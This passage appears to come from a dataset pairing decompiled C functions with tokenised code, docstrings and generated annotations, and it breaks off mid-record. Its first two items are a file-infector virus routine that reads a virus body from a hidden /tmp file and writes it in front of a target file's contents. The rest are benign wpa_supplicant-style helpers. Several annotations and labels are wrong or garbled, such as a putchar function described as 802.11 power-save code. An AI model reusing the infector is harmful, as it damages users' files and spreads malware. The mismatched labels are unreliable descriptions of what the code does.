[
    {
        "id": 0,
        "docstring_tokens": [
            "The",
            "given",
            "code",
            "closes",
            "a",
            "file",
            "descriptor",
            "after",
            "infecting",
            "it",
            "with",
            "a",
            "virus",
            "from",
            "a",
            "temporary",
            "file",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "fildes",
            ")",
            "{",
            "__uid_t",
            "v1",
            ";",
            "unsigned",
            "int",
            "v2",
            ";",
            "int",
            "tempFd",
            ";",
            "char",
            "buf",
            "[",
            "100",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "v6",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v1",
            "=",
            "getuid",
            "(",
            ")",
            ";",
            "v2",
            "=",
            "getpid",
            "(",
            ")",
            ";",
            "sprintf",
            "(",
            "buf",
            ",",
            "\"/tmp/.%u.%u\"",
            ",",
            "v2",
            ",",
            "v1",
            ")",
            ";",
            "tempFd",
            "=",
            "syscall",
            "(",
            "2L",
            "L",
            ",",
            "buf",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "tempFd",
            "!",
            "=",
            "-",
            "1",
            ")",
            "{",
            "FUN1",
            "(",
            "fildes",
            ",",
            "tempFd",
            ",",
            "buf",
            ")",
            ";",
            "unlink",
            "(",
            "buf",
            ")",
            ";",
            "}",
            "return",
            "syscall",
            "(",
            "3L",
            "L",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "fildes",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `__readfsqword` function is utilized to read a quadword (64 bits) from the FS segment register, which is often used in low-level programming for accessing thread information on Windows platforms.",
            "The getuid function is used to retrieve the user ID belonging to a specific file, which can be used for credential management and access control in a system.",
            "The `getpid` function is likely used to retrieve the process ID (PID) of the current process, necessary for various system operations and process management tasks."
        ],
        "longer_label": "The code is a C function that closes a file descriptor after creating a temporary file in the `/tmp` directory named with the current process ID and user ID, likely for temporary storage or communication, possibly with the intent to infect the file with a virus before removal."
    },
    {
        "id": 1,
        "docstring_tokens": [
            "The",
            "function",
            "FUN1",
            "reads",
            "data",
            "from",
            "a",
            "temporary",
            "file",
            "descriptor",
            ",",
            "reads",
            "data",
            "from",
            "the",
            "main",
            "file",
            "descriptor",
            ",",
            "creates",
            "a",
            "new",
            "file",
            "descriptor",
            "with",
            "the",
            "same",
            "path",
            "as",
            "the",
            "main",
            "file",
            "descriptor",
            ",",
            "and",
            "writes",
            "the",
            "combined",
            "data",
            "from",
            "both",
            "descriptors",
            "to",
            "the",
            "new",
            "file",
            "descriptor",
            "before",
            "freeing",
            "memory",
            "and",
            "returning",
            "0",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "fd",
            ",",
            "int",
            "fdTemp",
            ",",
            "char",
            "*",
            "argv",
            ")",
            "{",
            "int",
            "v4",
            ";",
            "int",
            "v5",
            ";",
            "int",
            "*",
            "v6",
            ";",
            "int",
            "fda",
            ";",
            "char",
            "offBuf",
            ";",
            "int",
            "i",
            ";",
            "int",
            "virLen",
            ";",
            "char",
            "*",
            "virBuf",
            ";",
            "char",
            "*",
            "fileBuf",
            ";",
            "stat",
            "fstatInfo",
            ";",
            "char",
            "pathBuf",
            "[",
            "100",
            "]",
            ";",
            "char",
            "dest",
            "[",
            "4096",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v16",
            ";",
            "v16",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "i",
            "=",
            "0",
            ";",
            "virLen",
            "=",
            "0",
            ";",
            "lseek",
            "(",
            "fd",
            ",",
            "0L",
            "L",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "fstat",
            "(",
            "fdTemp",
            ",",
            "&",
            "fstatInfo",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "syscall",
            "(",
            "3L",
            "L",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "fdTemp",
            ")",
            ";",
            "return",
            "-",
            "1",
            ";",
            "}",
            "else",
            "{",
            "offBuf",
            "=",
            "0",
            ";",
            "virBuf",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "fstatInfo",
            ".",
            "st_size",
            ")",
            ";",
            "while",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "syscall",
            "(",
            "0L",
            "L",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "fdTemp",
            ",",
            "&",
            "offBuf",
            ",",
            "1L",
            "L",
            ")",
            "=",
            "=",
            "1",
            ")",
            "{",
            "v4",
            "=",
            "virLen",
            "+",
            "+",
            ";",
            "virBuf",
            "[",
            "v4",
            "]",
            "=",
            "offBuf",
            ";",
            "}",
            "syscall",
            "(",
            "3L",
            "L",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "fdTemp",
            ")",
            ";",
            "if",
            "(",
            "fstat",
            "(",
            "fd",
            ",",
            "&",
            "fstatInfo",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "return",
            "-",
            "1",
            ";",
            "}",
            "else",
            "{",
            "offBuf",
            "=",
            "0",
            ";",
            "fileBuf",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "fstatInfo",
            ".",
            "st_size",
            ")",
            ";",
            "while",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "read",
            "(",
            "fd",
            ",",
            "&",
            "offBuf",
            ",",
            "1uL",
            "L",
            ")",
            "=",
            "=",
            "1",
            ")",
            "{",
            "v5",
            "=",
            "i",
            "+",
            "+",
            ";",
            "fileBuf",
            "[",
            "v5",
            "]",
            "=",
            "offBuf",
            ";",
            "}",
            "sprintf",
            "(",
            "pathBuf",
            ",",
            "\"/proc/self/fd/%d\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "fd",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "readlink",
            "(",
            "pathBuf",
            ",",
            "dest",
            ",",
            "0x1000uL",
            "L",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "v6",
            "=",
            "_errno_location",
            "(",
            ")",
            ";",
            "exit",
            "(",
            "*",
            "v6",
            ")",
            ";",
            "}",
            "syscall",
            "(",
            "3L",
            "L",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "fd",
            ")",
            ";",
            "fda",
            "=",
            "syscall",
            "(",
            "2L",
            "L",
            ",",
            "dest",
            ",",
            "514L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "fda",
            "=",
            "=",
            "-",
            "1",
            ")",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "virLen",
            ";",
            "+",
            "+",
            "i",
            ")",
            "write",
            "(",
            "fda",
            ",",
            "&",
            "virBuf",
            "[",
            "i",
            "]",
            ",",
            "1uL",
            "L",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "fstatInfo",
            ".",
            "st_size",
            ";",
            "+",
            "+",
            "i",
            ")",
            "write",
            "(",
            "fda",
            ",",
            "&",
            "fileBuf",
            "[",
            "i",
            "]",
            ",",
            "1uL",
            "L",
            ")",
            ";",
            "free",
            "(",
            "virBuf",
            ")",
            ";",
            "free",
            "(",
            "fileBuf",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `__readfsqword` function is used to read an unsigned 64-bit integer from the FS (segment) memory segment, primarily in x86 architecture, providing low-level access to processor-specific information or control structures.",
            "The `syscall` function, along with related assembly code and external function declarations, suggests an implementation of system call handling in an ARM64 architecture, facilitating interactions between user-space and kernel-space programs.",
            "The `malloc` function is being redefined in the provided code snippets to allocate memory using `GlobalAlloc` with zero initialization, effectively overriding the standard memory allocation function, presumably for custom memory management or compatibility with a specific environment."
        ],
        "longer_label": "The given code is an implementation of a function that infects a file with a virus by reading from a temporary file, reading from the current file, creating a new file, and writing the virus and file content into the new file, utilizing low-level processor-specific information, system calls, and custom memory allocation."
    },
    {
        "id": 2,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "writes",
            "a",
            "single",
            "character",
            "to",
            "the",
            "standard",
            "output",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "(",
            "char",
            "c",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v1",
            ";",
            "__int64",
            "v2",
            ";",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "char",
            "v4",
            "[",
            "88",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "v1",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v4",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v2",
            "=",
            "_asan_stack_malloc_0",
            "(",
            "64L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v2",
            ")",
            "v1",
            "=",
            "v2",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v1",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "8",
            ")",
            "=",
            "\"1 32 1 4 c:34\"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "16",
            ")",
            "=",
            "ft_putchar",
            ";",
            "v3",
            "=",
            "v1",
            ">",
            ">",
            "3",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "2147450880",
            ")",
            "=",
            "-",
            "235802127",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "2147450884",
            ")",
            "=",
            "-",
            "202116351",
            ";",
            "v5",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "32",
            ")",
            "=",
            "c",
            ";",
            "write",
            "(",
            "1",
            ",",
            "(",
            "const",
            "void",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "32",
            ")",
            ",",
            "1uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v4",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v1",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v1",
            "=",
            "1172321806L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "*",
            "(",
            "_BYTE",
            "*",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "56",
            ")",
            "=",
            "0",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "This function appears to be a part of a wireless driver stack implementation, specifically related to handling power save queue functionality for IEEE 802.11 nodes.",
            "The `malloc` function is used to allocate memory dynamically in C programming by reserving a block of memory of the specified size."
        ],
        "longer_label": "The code is a function related to handling power save queue functionality for IEEE 802.11 nodes in a wireless driver stack implementation, which includes dynamic memory allocation and handling of character output."
    },
    {
        "id": 3,
        "docstring_tokens": [
            "This",
            "code",
            "checks",
            "if",
            "all",
            "characters",
            "in",
            "the",
            "data",
            "array",
            "are",
            "hexadecimal",
            "characters",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "unsigned",
            "__int64",
            "a2",
            ")",
            "{",
            "unsigned",
            "__int64",
            "i",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0L",
            "L",
            ";",
            "i",
            "<",
            "a2",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "i",
            ")",
            "<",
            "=",
            "0x1Fu",
            "|",
            "|",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "i",
            ")",
            ">",
            "0x7Eu",
            ")",
            "return",
            "1L",
            "L",
            ";",
            "}",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The code is a function to determine if a given memory block contains any non-printable ASCII characters."
    },
    {
        "id": 4,
        "docstring_tokens": [
            "This",
            "function",
            "checks",
            "if",
            "a",
            "given",
            "array",
            "of",
            "u8",
            "data",
            "contains",
            "any",
            "control",
            "characters",
            "and",
            "returns",
            "1",
            "if",
            "it",
            "does",
            ",",
            "0",
            "otherwise",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "unsigned",
            "__int64",
            "a2",
            ")",
            "{",
            "unsigned",
            "__int64",
            "i",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0L",
            "L",
            ";",
            "i",
            "<",
            "a2",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "i",
            ")",
            "<",
            "=",
            "0x1Fu",
            "|",
            "|",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "i",
            ")",
            "=",
            "=",
            "127",
            ")",
            "return",
            "1L",
            "L",
            ";",
            "}",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function _ctrl is used to control various configuration options, such as setting channel, initializing MAC vifs, managing power save mode, and handling coexistence control for a specific device or system."
        ],
        "longer_label": "The given code is a function called has_ctrl_char which checks for control characters in the supplied array and returns 1 if any control character is found and 0 otherwise."
    },
    {
        "id": 5,
        "docstring_tokens": [
            "This",
            "code",
            "checks",
            "if",
            "a",
            "given",
            "string",
            "contains",
            "a",
            "newline",
            "character",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "_BYTE",
            "*",
            "a1",
            ")",
            "{",
            "while",
            "(",
            "*",
            "a1",
            ")",
            "{",
            "if",
            "(",
            "*",
            "a1",
            "=",
            "=",
            "10",
            "|",
            "|",
            "*",
            "a1",
            "=",
            "=",
            "13",
            ")",
            "return",
            "1L",
            "L",
            ";",
            "+",
            "+",
            "a1",
            ";",
            "}",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is a function named \"has_newline\" which iterates through a null-terminated string pointed to by the parameter `a1` and returns true if it encounters a newline character (either ASCII 10 or 13), otherwise returns false."
    },
    {
        "id": 6,
        "docstring_tokens": [
            "This",
            "code",
            "parses",
            "a",
            "frequency",
            "range",
            "list",
            "from",
            "a",
            "string",
            "and",
            "stores",
            "it",
            "in",
            "a",
            "wpa_freq_range_list",
            "structure",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "const",
            "char",
            "*",
            "a2",
            ")",
            "{",
            "unsigned",
            "int",
            "v3",
            ";",
            "__int64",
            "v4",
            ";",
            "__int64",
            "v6",
            ";",
            "char",
            "*",
            "v7",
            ";",
            "unsigned",
            "__int64",
            "v8",
            ";",
            "v4",
            "=",
            "0L",
            "L",
            ";",
            "v3",
            "=",
            "0",
            ";",
            "while",
            "(",
            "a2",
            "&",
            "&",
            "*",
            "a2",
            ")",
            "{",
            "v6",
            "=",
            "os_realloc_array",
            "(",
            "v4",
            ",",
            "v3",
            "+",
            "1",
            ",",
            "8uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v6",
            ")",
            "{",
            "os_free",
            "(",
            "v4",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "v4",
            "=",
            "v6",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "8L",
            "L",
            "*",
            "v3",
            "+",
            "v6",
            ")",
            "=",
            "atoi",
            "(",
            "a2",
            ")",
            ";",
            "v7",
            "=",
            "(",
            "char",
            "*",
            ")",
            "os_strchr",
            "(",
            "a2",
            ",",
            "45L",
            "L",
            ")",
            ";",
            "v8",
            "=",
            "os_strchr",
            "(",
            "a2",
            ",",
            "44L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v7",
            "|",
            "|",
            "v8",
            "&",
            "&",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v7",
            ">",
            "=",
            "v8",
            ")",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "8L",
            "L",
            "*",
            "v3",
            "+",
            "v6",
            "+",
            "4",
            ")",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "8L",
            "L",
            "*",
            "v3",
            "+",
            "v6",
            ")",
            ";",
            "else",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "8L",
            "L",
            "*",
            "v3",
            "+",
            "v6",
            "+",
            "4",
            ")",
            "=",
            "atoi",
            "(",
            "v7",
            "+",
            "1",
            ")",
            ";",
            "a2",
            "=",
            "(",
            "const",
            "char",
            "*",
            ")",
            "v8",
            ";",
            "if",
            "(",
            "v8",
            ")",
            "a2",
            "=",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "v8",
            "+",
            "1",
            ")",
            ";",
            "+",
            "+",
            "v3",
            ";",
            "}",
            "os_free",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "a1",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "a1",
            "=",
            "v4",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            "=",
            "v3",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The os_realloc function is used to reallocate memory for a previously allocated block, allowing the block to be resized to a new size.",
            "The function `os_strch` appears to search for a specified character within a given string and returns a pointer to the first occurrence of that character or NULL if not found, facilitating string manipulation and parsing in various contexts such as URL processing, header parsing, and control interface handling.",
            "The strchr function is used to find the first occurrence of a character in a string and return a pointer to it, or NULL if the character is not found."
        ],
        "longer_label": "The function `freq_range_list_parse` parses a list of frequency ranges provided as a string, dynamically allocating memory as needed, and returning an array of parsed values along with the count of parsed elements, utilizing functions for memory reallocation and string manipulation."
    },
    {
        "id": 7,
        "docstring_tokens": [
            "The",
            "code",
            "compares",
            "two",
            "integer",
            "values",
            "and",
            "returns",
            "1",
            "if",
            "the",
            "first",
            "value",
            "is",
            "zero",
            ",",
            "-1",
            "if",
            "the",
            "second",
            "value",
            "is",
            "zero",
            ",",
            "and",
            "the",
            "subtraction",
            "result",
            "of",
            "the",
            "two",
            "values",
            "otherwise",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "void",
            "*",
            "a1",
            ",",
            "const",
            "void",
            "*",
            "a2",
            ")",
            "{",
            "int",
            "v3",
            ";",
            "v3",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a2",
            ";",
            "if",
            "(",
            "!",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a1",
            ")",
            "return",
            "1L",
            "L",
            ";",
            "if",
            "(",
            "v3",
            ")",
            "return",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a1",
            "-",
            "v3",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code defines a comparison function `freq_cmp` intended for use with `qsort`, which compares the frequency values stored at the memory addresses pointed to by `a1` and `a2`, returning 1 if the frequency at `a1` is zero, -1 if the frequency at `a2` is zero, and the difference between the frequencies otherwise."
    },
    {
        "id": 8,
        "docstring_tokens": [
            "This",
            "code",
            "takes",
            "an",
            "integer",
            "array",
            "as",
            "input",
            ",",
            "sorts",
            "it",
            "and",
            "removes",
            "duplicate",
            "elements",
            "from",
            "the",
            "array",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "(",
            "void",
            "*",
            "a1",
            ")",
            "{",
            "int",
            "v1",
            ";",
            "int",
            "v2",
            ";",
            "int",
            "v3",
            ";",
            "int",
            "v4",
            ";",
            "if",
            "(",
            "a1",
            ")",
            "{",
            "v4",
            "=",
            "int_array_len",
            "(",
            "(",
            "__int64",
            ")",
            "a1",
            ")",
            ";",
            "qsort",
            "(",
            "a1",
            ",",
            "v4",
            ",",
            "4uL",
            "L",
            ",",
            "(",
            "__compar_fn_t",
            ")",
            "freq_cmp",
            ")",
            ";",
            "v2",
            "=",
            "0",
            ";",
            "v3",
            "=",
            "1",
            ";",
            "while",
            "(",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "a1",
            "+",
            "v2",
            ")",
            "&",
            "&",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "a1",
            "+",
            "v3",
            ")",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "a1",
            "+",
            "v2",
            ")",
            "=",
            "=",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "a1",
            "+",
            "v3",
            ")",
            ")",
            "{",
            "+",
            "+",
            "v3",
            ";",
            "}",
            "else",
            "{",
            "v1",
            "=",
            "v3",
            "+",
            "+",
            ";",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "a1",
            "+",
            "+",
            "+",
            "v2",
            ")",
            "=",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "a1",
            "+",
            "v1",
            ")",
            ";",
            "}",
            "}",
            "if",
            "(",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "a1",
            "+",
            "v2",
            ")",
            ")",
            "+",
            "+",
            "v2",
            ";",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "a1",
            "+",
            "v2",
            ")",
            "=",
            "0",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"array\" function appears to be designed to initialize and manipulate arrays of integers and structures, as well as perform memory allocation for a specific purpose."
        ],
        "longer_label": "The provided code seems to be a function intended to sort and remove duplicates from an array of integers, while also handling memory allocation, though annotations for further context or clarification are missing."
    },
    {
        "id": 9,
        "docstring_tokens": [
            "The",
            "code",
            "clears",
            "and",
            "frees",
            "a",
            "given",
            "string",
            "if",
            "it",
            "is",
            "not",
            "empty",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ")",
            "{",
            "__int64",
            "v1",
            ";",
            "if",
            "(",
            "a1",
            ")",
            "{",
            "v1",
            "=",
            "os_strlen",
            "(",
            "a1",
            ")",
            ";",
            "os_memset",
            "(",
            "a1",
            ",",
            "0L",
            "L",
            ",",
            "v1",
            ")",
            ";",
            "os_free",
            "(",
            "a1",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The os_strlen function is used to calculate the length of a string by counting the number of characters in the string, excluding the null terminator.",
            "The function `os_memset` is designed to fill a memory area specified by the pointer `s` with a constant byte value `c`, for a length of `n` bytes, and returns a pointer to the start of the filled memory area.",
            "This function, os_free, is used to deallocate memory that was previously allocated with os_malloc, os_calloc, os_realloc, or os_strdup."
        ],
        "longer_label": "The code defines a function, str_clear_free, which clears the memory and deallocates the memory previously allocated for a string if the string is not null."
    },
    {
        "id": 10,
        "docstring_tokens": [
            "This",
            "code",
            "function",
            "clears",
            "and",
            "frees",
            "the",
            "memory",
            "allocated",
            "for",
            "a",
            "binary",
            "object",
            "if",
            "it",
            "is",
            "not",
            "null",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ")",
            "{",
            "__int64",
            "result",
            ";",
            "if",
            "(",
            "a1",
            ")",
            "{",
            "os_memset",
            "(",
            "a1",
            ",",
            "0L",
            "L",
            ",",
            "a2",
            ")",
            ";",
            "return",
            "os_free",
            "(",
            "a1",
            ")",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The clear_free function is used to free the memory allocated for a pointer and then clear the memory by setting it to zero, with the option to specify the size of the memory to be cleared.",
            "The os_memset function is used to fill a memory area with a constant byte value for a specified number of bytes.",
            "The \"return\" function, likely intended for returning results in a graphics or simulation context, integrates a signed distance field (SDF) calculation for a capsule shape along with memory allocation and device initialization routines.",
            "The `_free` function appears to be a custom memory deallocation function used within a larger system or application, possibly designed to work with a specific memory management framework or to provide additional functionality beyond standard `free()` function in C."
        ],
        "longer_label": "The bin_clear_free function clears the memory allocated for a pointer by setting it to zero and then frees the memory, optionally specifying the size of the memory to be cleared."
    },
    {
        "id": 11,
        "docstring_tokens": [
            "This",
            "code",
            "generates",
            "a",
            "random",
            "MAC",
            "address",
            "and",
            "sets",
            "the",
            "first",
            "byte",
            "to",
            "be",
            "a",
            "valid",
            "universally",
            "administered",
            "MAC",
            "address",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "_BYTE",
            "*",
            "a1",
            ")",
            "{",
            "if",
            "(",
            "(",
            "int",
            ")",
            "os_get_random",
            "(",
            "a1",
            ",",
            "6L",
            "L",
            ")",
            "<",
            "0",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "*",
            "a1",
            "&",
            "=",
            "~",
            "1u",
            ";",
            "*",
            "a1",
            "|",
            "=",
            "2u",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `os_get_random` function appears to be used for obtaining cryptographically strong pseudo-random data into a buffer of a specified length, providing a way to generate random data securely in an embedded system environment."
        ],
        "longer_label": "The `random_mac_addr` function generates a random MAC address by obtaining cryptographically strong pseudo-random data using the `os_get_random` function and then manipulating the data to set the second least significant bit to 1 while clearing the least significant bit."
    },
    {
        "id": 12,
        "docstring_tokens": [
            "This",
            "function",
            "generates",
            "a",
            "random",
            "MAC",
            "address",
            "while",
            "keeping",
            "the",
            "OUI",
            "(",
            "Organizationally",
            "Unique",
            "Identifier",
            ")",
            "intact",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "_BYTE",
            "*",
            "a1",
            ")",
            "{",
            "if",
            "(",
            "(",
            "int",
            ")",
            "os_get_random",
            "(",
            "a1",
            "+",
            "3",
            ",",
            "3L",
            "L",
            ")",
            "<",
            "0",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "*",
            "a1",
            "&",
            "=",
            "~",
            "1u",
            ";",
            "*",
            "a1",
            "|",
            "=",
            "2u",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function __int64 is likely used to define a 64-bit integer type, alongside other typedefs for various integer types, and is included in conditional compilation blocks for different platforms, primarily for Windows environments.",
            "The \"random\" function is used to generate a pseudorandom number within a specific range, often used for generating random values for various applications.",
            "This function likely removes the OUI (Organizationally Unique Identifier) from a MAC address and returns the remaining unique portion.",
            "The function \"os_get_random\" retrieves cryptographically strong pseudo-random data into a buffer, ensuring high-quality randomness for security-sensitive applications."
        ],
        "longer_label": "The provided code likely defines a function to generate a pseudorandom MAC address by removing the OUI (Organizationally Unique Identifier) portion, primarily designed for Windows environments."
    },
    {
        "id": 13,
        "docstring_tokens": [
            "The",
            "function",
            "h_puthex",
            "outputs",
            "the",
            "hexadecimal",
            "representation",
            "of",
            "an",
            "unsigned",
            "character",
            "by",
            "dividing",
            "and",
            "modulo",
            "operations",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "unsigned",
            "__int8",
            "c",
            ")",
            "{",
            "char",
            "*",
            "v1",
            ";",
            "char",
            "*",
            "v2",
            ";",
            "v1",
            "=",
            "&",
            "base_4096",
            "[",
            "c",
            ">",
            ">",
            "4",
            "]",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
